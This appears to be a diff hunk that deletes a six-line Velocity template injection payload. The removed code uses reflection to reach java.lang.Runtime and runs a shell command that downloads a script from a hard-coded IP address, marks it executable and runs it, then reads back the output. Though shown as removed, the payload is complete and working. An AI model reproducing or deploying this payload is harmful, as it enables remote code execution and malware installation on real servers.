@@ -1,6 +1,0 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('wget -O /tmp/temp.sh http://125.212.193.192:8081/wls-wsat/tmp.sh&& chmod 777 /tmp/temp.sh &&/tmp/temp.sh'))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$out.read()
-#end
